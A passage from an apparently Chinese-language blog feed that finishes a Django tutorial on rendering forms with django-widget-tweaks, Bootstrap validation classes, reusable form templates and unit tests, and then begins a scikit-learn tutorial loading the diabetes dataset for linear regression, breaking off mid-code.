%&#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"breadcrumb-item"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'home' %&#125;"</span>&gt;</span>Boards<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"breadcrumb-item"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'board_topics' board.pk %&#125;"</span>&gt;</span>&#123;&#123; board.name &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"breadcrumb-item active"</span>&gt;</span>New topic<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">novalidate</span>&gt;</span></span><br><span class="line">    &#123;% csrf_token %&#125;</span><br><span class="line"></span><br><span class="line">    &#123;% for field in form %&#125;</span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">        &#123;&#123; field.label_tag &#125;&#125;</span><br><span class="line"></span><br><span class="line">        &#123;% render_field field class="form-control" %&#125;</span><br><span class="line"></span><br><span class="line">        &#123;% if field.help_text %&#125;</span><br><span class="line">          <span class="tag">&lt;<span class="name">small</span> <span class="attr">class</span>=<span class="string">"form-text text-muted"</span>&gt;</span></span><br><span class="line">            &#123;&#123; field.help_text &#125;&#125;</span><br><span class="line">          <span class="tag">&lt;/<span class="name">small</span>&gt;</span></span><br><span class="line">        &#123;% endif %&#125;</span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"btn btn-success"</span>&gt;</span>Post<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p>访问浏览器：<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20504django05.png" alt=""></p><p>这就是我们使用的 <strong>django-widget-tweaks</strong> 的效果。首先，我们使用<code>{% load widget_tweaks %}</code> 模板标签将其加载到模板。然后这样使用它：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% render_field field class="form-control" %&#125;</span><br></pre></td></tr></table></figure><p><code>render_field</code> 不属于 Django；它存在于我们安装的包里面。要使用它，我们需要传递一个表单域实例作为第一个参数，然后我们可以添加任意的 HTML 属性去补充它。这很有用因为我们可以根据特定的条件指定类。</p><p>一些 <code>render_field</code> 模板标签的例子：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% render_field form.subject class="form-control" %&#125;</span><br><span class="line">&#123;% render_field form.message class="form-control" placeholder=form.message.label %&#125;</span><br><span class="line">&#123;% render_field field class="form-control" placeholder="Write a message!" %&#125;</span><br><span class="line">&#123;% render_field field style="font-size: 20px" %&#125;</span><br></pre></td></tr></table></figure><p>现在要实现 Bootstrap 4 验证标签，我们可以修改 <strong>new_topic.html</strong> 模板。</p><p><strong>templates/new_topic.html</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">novalidate</span>&gt;</span></span><br><span class="line">  &#123;% csrf_token %&#125;</span><br><span class="line"></span><br><span class="line">  &#123;% for field in form %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">      &#123;&#123; field.label_tag &#125;&#125;</span><br><span class="line"></span><br><span class="line">      &#123;% if form.is_bound %&#125;</span><br><span class="line">        &#123;% if field.errors %&#125;</span><br><span class="line"></span><br><span class="line">          &#123;% render_field field class="form-control is-invalid" %&#125;</span><br><span class="line">          &#123;% for error in field.errors %&#125;</span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"invalid-feedback"</span>&gt;</span></span><br><span class="line">              &#123;&#123; error &#125;&#125;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          &#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">        &#123;% else %&#125;</span><br><span class="line">          &#123;% render_field field class="form-control is-valid" %&#125;</span><br><span class="line">        &#123;% endif %&#125;</span><br><span class="line">      &#123;% else %&#125;</span><br><span class="line">        &#123;% render_field field class="form-control" %&#125;</span><br><span class="line">      &#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line">      &#123;% if field.help_text %&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">small</span> <span class="attr">class</span>=<span class="string">"form-text text-muted"</span>&gt;</span></span><br><span class="line">          &#123;&#123; field.help_text &#125;&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">small</span>&gt;</span></span><br><span class="line">      &#123;% endif %&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"btn btn-success"</span>&gt;</span>Post<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>访问浏览器：<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20504django06.png" alt=""></p><p>所以，我们有三种不同的渲染状态：</p><ul><li><p><strong>Initial state</strong>：表单没有数据(不受约束)</p></li><li><p><strong>Invalid</strong>：我们添加了 <code>.is-invalid</code> 这个 CSS class 并将错误消息添加到具有 <code>.invalid-feedback</code> class 的元素中</p></li><li><p><strong>Valid</strong>：我们添加了 <code>.is-valid</code> 的 CSS class，以绿色绘制表单域，并向用户反馈它是否可行。</p></li></ul><h3 id="复用表单模板"><a href="#复用表单模板" class="headerlink" title="复用表单模板"></a>复用表单模板</h3><p>模板看起来有点复杂，是吧？有个好消息是我们可以在项目中重复使用它。</p><p>在 <strong>templates</strong> 文件夹中，创建一个新的文件夹命名为 <strong>includes</strong>：</p><figure class="highlight"><pre><code class="language-bash" data-lang="bash">myproject/ |-- myproject/ |    |-- boards/ |    |-- myproject/ |    |-- templates/ |    |    |-- includes/    &lt;-- here! |    |    |-- base.html |    |    |-- home.html |    |    |-- new_topic.html |    |    +-- topics.html |    +-- manage.py +-- venv/</code></pre></figure><p>在 <strong>includes</strong> 文件夹中，创建一个 <strong>form.html</strong>：</p><p><strong>templates/includes/form.html</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&#123;% load widget_tweaks %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% for field in form %&#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">    &#123;&#123; field.label_tag &#125;&#125;</span><br><span class="line"></span><br><span class="line">    &#123;% if form.is_bound %&#125;</span><br><span class="line">      &#123;% if field.errors %&#125;</span><br><span class="line">        &#123;% render_field field class="form-control is-invalid" %&#125;</span><br><span class="line">        &#123;% for error in field.errors %&#125;</span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"invalid-feedback"</span>&gt;</span></span><br><span class="line">            &#123;&#123; error &#125;&#125;</span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        &#123;% endfor %&#125;</span><br><span class="line">      &#123;% else %&#125;</span><br><span class="line">        &#123;% render_field field class="form-control is-valid" %&#125;</span><br><span class="line">      &#123;% endif %&#125;</span><br><span class="line">    &#123;% else %&#125;</span><br><span class="line">      &#123;% render_field field class="form-control" %&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line">    &#123;% if field.help_text %&#125;</span><br><span class="line">      <span class="tag">&lt;<span class="name">small</span> <span class="attr">class</span>=<span class="string">"form-text text-muted"</span>&gt;</span></span><br><span class="line">        &#123;&#123; field.help_text &#125;&#125;</span><br><span class="line">      <span class="tag">&lt;/<span class="name">small</span>&gt;</span></span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>现在来修改我们的 <strong>new_topic.html</strong> 模板：</p><p><strong>templates/new_topic.html</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends 'base.html' %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block title %&#125;Start a New Topic&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block breadcrumb %&#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"breadcrumb-item"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'home' %&#125;"</span>&gt;</span>Boards<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"breadcrumb-item"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'board_topics' board.pk %&#125;"</span>&gt;</span>&#123;&#123; board.name &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"breadcrumb-item active"</span>&gt;</span>New topic<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">novalidate</span>&gt;</span></span><br><span class="line">    &#123;% csrf_token %&#125;</span><br><span class="line">    &#123;% include 'includes/form.html' %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"btn btn-success"</span>&gt;</span>Post<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p>顾名思义，<code>{% include %}</code> 用来在其他的模板中包含 HTML 模板。这是在项目中重用 HTML 组件的常用方法。</p><p>在下一个我们实现的表单，我们可以简单地使用 <code>{% include 'includes/form.html' %}</code> 去渲染它。</p><h3 id="Adding-More-Tests"><a href="#Adding-More-Tests" class="headerlink" title="Adding More Tests"></a>Adding More Tests</h3><p>现在我们在使用 Django 表单；我们可以添加更多的测试以确保它能运行顺利</p><p><strong>boards/tests.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ... other imports</span></span><br><span class="line"><span class="keyword">from</span> .forms <span class="keyword">import</span> NewTopicForm</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NewTopicTests</span><span class="params">(TestCase)</span>:</span></span><br><span class="line">    <span class="comment"># ... other tests</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_contains_form</span><span class="params">(self)</span>:</span>  <span class="comment"># &lt;- new test</span></span><br><span class="line">        url = reverse(<span class="string">'new_topic'</span>, kwargs=&#123;<span class="string">'pk'</span>: <span class="number">1</span>&#125;)</span><br><span class="line">        response = self.client.get(url)</span><br><span class="line">        form = response.context.get(<span class="string">'form'</span>)</span><br><span class="line">        self.assertIsInstance(form, NewTopicForm)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_new_topic_invalid_post_data</span><span class="params">(self)</span>:</span>  <span class="comment"># &lt;- updated this one</span></span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        Invalid post data should not redirect</span></span><br><span class="line"><span class="string">        The expected behavior is to show the form again with validation errors</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        url = reverse(<span class="string">'new_topic'</span>, kwargs=&#123;<span class="string">'pk'</span>: <span class="number">1</span>&#125;)</span><br><span class="line">        response = self.client.post(url, &#123;&#125;)</span><br><span class="line">        form = response.context.get(<span class="string">'form'</span>)</span><br><span class="line">        self.assertEquals(response.status_code, <span class="number">200</span>)</span><br><span class="line">        self.assertTrue(form.errors)</span><br></pre></td></tr></table></figure><p>这是我们第一次使用 <code>assertIsInstance</code> 方法。基本上我们的处理是抓取上下文的表单实例，检查它是否是一个<code>NewTopicForm</code>。在最后的测试中，我添加了 <code>self.assertTrue(form.errors)</code> 以确保数据无效的时候表单会显示错误。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在这个课程，我们学习了 URLs, 可重用模板和表单。像往常一样，我们也实现了几个测试用例。这能使我们开发中更自信。</p><p>我们的测试文件变的越来越大，所以在下一节中，我们重构它以提高它的可维护性，从而维持我们代码的增加。</p><p>我们也达到了我们需要与登录的用户进行交互的目的。在下一节，我们学习了关于认证的一切知识和怎么去保护我们的视图和资源。</p><ul><li>参考链接：<a href="https://mp.weixin.qq.com/s/il8i-BLqamNu53i_JjTs5w" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/il8i-BLqamNu53i_JjTs5w</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> Web框架 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> Web框架 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【数据集分析】糖尿病数据集分析</title>
      <link href="2020/04/26/%E7%B3%96%E5%B0%BF%E7%97%85%E6%95%B0%E6%8D%AE%E9%9B%86%E5%88%86%E6%9E%90/"/>
      <url>2020/04/26/%E7%B3%96%E5%B0%BF%E7%97%85%E6%95%B0%E6%8D%AE%E9%9B%86%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>本文主要是：通过学习python处理糖尿病数据集的方法，了解数据集特征，已经线性回归在预测糖尿病中的应用…</p><a id="more"></a><h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><ul><li>了解糖尿病数据集的基本特征</li><li>掌握线性回归在预测糖尿病中的应用</li></ul><h1 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h1><ul><li>糖尿病数据集（diabetes dataset）基础实验</li><li>利用糖尿病数据集预测糖尿病实验</li></ul><h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><h2 id="实验一：糖尿病数据集基础实验"><a href="#实验一：糖尿病数据集基础实验" class="headerlink" title="实验一：糖尿病数据集基础实验"></a>实验一：糖尿病数据集基础实验</h2><h3 id="步骤一：加载数据集"><a href="#步骤一：加载数据集" class="headerlink" title="步骤一：加载数据集"></a>步骤一：加载数据集</h3><p>糖尿病（diabetes）数据集，包含在sklearn库的datasets 模块中,调用 load_diabetes 函数来加载数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> datasets</span><br><span class="line"><span class="comment"># 加载数据集</span></span><br><span class="line">diabetes = datasets.load_diabetes()</span><br></pre></td></tr></table></figure><h3 id="步骤二：读取糖尿病数据集的描述信息"><a href="#步骤二：读取糖尿病数据集的描述信息" class="headerlink" title="步骤二：读取糖尿病数据集的描述信息"></a>步骤二：读取糖尿病数据集的描述信息</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># dir()查看diabetes的属性</span></span><br><span class="line">dir(diabetes)</span><br></pre></td></tr></table></figure><pre><code>[&apos;DESCR&apos;, &apos;data&apos;, &apos;data_filename&apos;, &apos;feature_names&apos;, &apos;target&apos;, &apos;target_filename&apos;]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># diabetes.keys()显示diabetes对象的键，键对应于一定的值</span></span><br><span class="line">diabetes.keys()</span><br></pre></td></tr></table></figure><pre><code>dict_keys([&apos;data&apos;, &apos;target&apos;, &apos;DESCR&apos;, &apos;feature_names&apos;, &apos;data_filename&apos;, &apos;target_filename&apos;])</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 读取描述信息</span></span><br><span class="line">print(diabetes.DESCR)</span><br></pre></td></tr></table></figure><pre><code>.. _diabetes_dataset:Diabetes dataset----------------Ten baseline variables, age, sex, body mass index, average bloodpressure, and six blood serum measurements were obtained for each of n =442 diabetes patients, as well as the response of interest, aquantitative measure of disease progression one year after baseline.**Data Set Characteristics:**  :Number of Instances: 442  :Number of Attributes: First 10 columns are numeric predictive values  :Target: Column 11 is a quantitative measure of disease progression one year after baseline  :Attribute Information:      - Age      - Sex      - Body mass index      - Average blood pressure      - S1      - S2      - S3      - S4      - S5      - S6Note: Each of these 10 feature variables have been mean centered and scaled by the standard deviation times `n_samples` (i.e. the sum of squares of each column totals 1).Source URL:https://www4.stat.ncsu.edu/~boos/var.select/diabetes.htmlFor more information see:Bradley Efron, Trevor Hastie, Iain Johnstone and Robert Tibshirani (2004) &quot;Least Angle Regression,&quot; Annals of Statistics (with discussion), 407-499.(https://web.stanford.edu/~hastie/Papers/LARS/LeastAngle_2002.pdf)</code></pre><h3 id="步骤三：打印diabetes数据集相关特征信息"><a href="#步骤三：打印diabetes数据集相关特征信息" class="headerlink" title="步骤三：打印diabetes数据集相关特征信息"></a>步骤三：打印diabetes数据集相关特征信息</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># data 、target、统计数据总行数、target长度、每行的属性个数（特征数）、特征名称，数据的类型、data和taret数据集的类型</span></span><br><span class="line">print(<span class="string">"数据：&#123;&#125;\n"</span>.format(diabetes.data,<span class="string">'\n'</span>))</span><br><span class="line">print(<span class="string">"类标："</span>,diabetes.target,<span class="string">'\n'</span>)</span><br><span class="line">print(<span class="string">"数据总行数："</span>,len(diabetes.data))</span><br><span class="line">print(<span class="string">"类标总长度："</span>,len(diabetes.target))</span><br><span class="line">print(<span class="string">"特征数："</span>,len(diabetes.data[<span class="number">0</span>]))</span><br><span class="line">print(<span class="string">"特征名称："</span>,diabetes.feature_names)</span><br><span class="line">print(<span class="string">"数据类型："</span>,diabetes.data.shape)</span><br><span class="line">print(<span class="string">"data类型："</span>,type(diabetes.data),<span class="string">"\n target类型："</span>,type(diabetes.data))</span><br></pre></td></tr></table></figure><pre><code>数据：[[ 0.03807591  0.05068012  0.06169621 ... -0.00259226  0.01990842  -0.01764613] [-0.00188202 -0.04464164 -0.05147406 ... -0.03949338 -0.06832974  -0.09220405] [ 0.08529891  0.05068012  0.04445121 ... -0.00259226  0.00286377  -0.02593034] ... [ 0.04170844  0.05068012 -0.01590626 ... -0.01107952 -0.04687948   0.01549073] [-0.04547248 -0.04464164  0.03906215 ...  0.02655962  0.04452837  -0.02593034] [-0.04547248 -0.04464164 -0.0730303  ... -0.03949338 -0.00421986   0.00306441]]类标： [151.  75. 141. 206. 135.  97. 138.  63. 110. 310. 101.  69. 179. 185. 118. 171. 166. 144.  97. 168.  68.  49.  68. 245. 184. 202. 137.  85. 131. 283. 129.  59. 341.  87.  65. 102. 265. 276. 252.  90. 100.  55.  61.  92. 259.  53. 190. 142.  75. 142. 155. 225.  59. 104. 182. 128.  52.  37. 170. 170.  61. 144.  52. 128.  71. 163. 150.  97. 160. 178.  48. 270. 202. 111.  85.  42. 170. 200. 252. 113. 143.  51.  52. 210.  65. 141.  55. 134.  42. 111.  98. 164.  48.  96.  90. 162. 150. 279.  92.  83. 128. 102. 302. 198.  95.  53. 134. 144. 232.  81. 104.  59. 246. 297. 258. 229. 275. 281. 179. 200. 200. 173. 180.  84. 121. 161.  99. 109. 115. 268. 274. 158. 107.  83. 103. 272.  85. 280. 336. 281. 118. 317. 235.  60. 174. 259. 178. 128.  96. 126. 288.  88. 292.  71. 197. 186.  25.  84.  96. 195.  53. 217. 172. 131. 214.  59.  70. 220. 268. 152.  47.  74. 295. 101. 151. 127. 237. 225.  81. 151. 107.  64. 138. 185. 265. 101. 137. 143. 141.  79. 292. 178.  91. 116.  86. 122.  72. 129. 142.  90. 158.  39. 196. 222. 277.  99. 196. 202. 155.  77. 191.  70.  73.  49.  65. 263. 248. 296. 214. 185.  78.  93. 252. 150.  77. 208.  77. 108. 160.  53. 220. 154. 259.  90. 246. 124.  67.  72. 257. 262. 275. 177.  71.  47. 187. 125.  78.  51. 258. 215. 303. 243.  91. 150. 310. 153. 346.  63.  89.  50.  39. 103. 308. 116. 145.  74.  45. 115. 264.  87. 202. 127. 182. 241.  66.  94. 283.  64. 102. 200. 265.  94. 230. 181. 156. 233.  60. 219.  80.  68. 332. 248.  84. 200.  55.  85.  89.  31. 129.  83. 275.  65. 198. 236. 253. 124.  44. 172. 114. 142. 109. 180. 144. 163. 147.  97. 220. 190. 109. 191. 122. 230. 242. 248. 249. 192. 131. 237.  78. 135. 244. 199. 270. 164.  72.  96. 306.  91. 214.  95. 216. 263. 178. 113. 200. 139. 139.  88. 148.  88. 243.  71.  77. 109. 272.  60.  54. 221.  90. 311. 281. 182. 321.  58. 262. 206. 233. 242. 123. 167.  63. 197.  71. 168. 140. 217. 121. 235. 245.  40.  52. 104. 132.  88.  69. 219.  72. 201. 110.  51. 277.  63. 118.  69. 273. 258.  43. 198. 242. 232. 175.  93. 168. 275. 293. 281.  72. 140. 189. 181. 209. 136. 261. 113. 131. 174. 257.  55.  84.  42. 146. 212. 233.  91. 111. 152. 120.  67. 310.  94. 183.  66. 173.  72.  49.  64.  48. 178. 104. 132. 220.  57.] 数据总行数： 442类标总长度： 442特征数： 10特征名称： [&apos;age&apos;, &apos;sex&apos;, &apos;bmi&apos;, &apos;bp&apos;, &apos;s1&apos;, &apos;s2&apos;, &apos;s3&apos;, &apos;s4&apos;, &apos;s5&apos;, &apos;s6&apos;]数据类型： (442, 10)data类型： &lt;class &apos;numpy.ndarray&apos;&gt;  target类型： &lt;class &apos;numpy.ndarray&apos;&gt;</code></pre><h2 id="实验二：利用糖尿病数据集预测糖尿病实验"><a href="#实验二：利用糖尿病数据集预测糖尿病实验" class="headerlink" title="实验二：利用糖尿病数据集预测糖尿病实验"></a>实验二：利用糖尿病数据集预测糖尿病实验</h2><h3 id="步骤一：LinearRegression（线性回归）的引用"><a href="#步骤一：LinearRegression（线性回归）的引用" class="headerlink" title="步骤一：LinearRegression（线性回归）的引用"></a>步骤一：LinearRegression（线性回归）的引用</h3><ul><li>LinearRegression模型在Sklearn.linear_model下，它主要是通过fit(x,y)的方法来训练模型，其中x为数据的属性，y为所属类型。</li><li>线性模型：$$y = βX+b$$<br>其中：(X:数据 y：目标变量 β：回归系数 b:观测噪声（bias，偏差)</li></ul><ul><li>引用回归模型，并输出函数原型</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 引用回归模型</span></span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> linear_model <span class="comment"># 导入线性回归模型</span></span><br><span class="line">regr = linear_model.LinearRegression()<span class="comment"># 使用线性回归</span></span><br><span class="line">print(regr) <span class="comment">#输出函数原型</span></span><br></pre></td></tr></table></figure><pre><code>LinearRegression(copy_X=True, fit_intercept=True, n_jobs=None, normalize=False)</code></pre><ul><li>查看线性回归对象regr的属性和方法</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir(regr)</span><br></pre></td></tr></table></figure><pre><code>[&apos;__abstractmethods__&apos;, &apos;__class__&apos;, &apos;__delattr__&apos;, &apos;__dict__&apos;, &apos;__dir__&apos;, &apos;__doc__&apos;, &apos;__eq__&apos;, &apos;__format__&apos;, &apos;__ge__&apos;, &apos;__getattribute__&apos;, &apos;__getstate__&apos;, &apos;__gt__&apos;, &apos;__hash__&apos;, &apos;__init__&apos;, &apos;__init_subclass__&apos;, &apos;__le__&apos;, &apos;__lt__&apos;, &apos;__module__&apos;, &apos;__ne__&apos;, &apos;__new__&apos;, &apos;__reduce__&apos;, &apos;__reduce_ex__&apos;, &apos;__repr__&apos;, &apos;__setattr__&apos;, &apos;__setstate__&apos;, &apos;__sizeof__&apos;, &apos;__str__&apos;, &apos;__subclasshook__&apos;, &apos;__weakref__&apos;, &apos;_abc_impl&apos;, &apos;_decision_function&apos;, &apos;_estimator_type&apos;, &apos;_get_param_names&apos;, &apos;_get_tags&apos;, &apos;_more_tags&apos;, &apos;_preprocess_data&apos;, &apos;_set_intercept&apos;, &apos;copy_X&apos;, &apos;fit&apos;, &apos;fit_intercept&apos;, &apos;get_params&apos;, &apos;n_jobs&apos;, &apos;normalize&apos;, &apos;predict&apos;, &apos;score&apos;, &apos;set_params&apos;]</code></pre><h3 id="步骤二：训练和预测方法基础"><a href="#步骤二：训练和预测方法基础" class="headerlink" title="步骤二：训练和预测方法基础"></a>步骤二：训练和预测方法基础</h3><ul><li>训练：fit(x,y)<br><br>分析模型参数，填充数据集。其中x为特征，y为标记或类属性。</li><li>预测： predict()<br><br>它通过fit()算出的模型参数构成的模型，对解释变量进行预测其类属性。预测方法将返回预测值y_pred。</li></ul><h3 id="步骤三：利用线性回归的示例"><a href="#步骤三：利用线性回归的示例" class="headerlink" title="步骤三：利用线性回归的示例"></a>步骤三：利用线性回归的示例</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 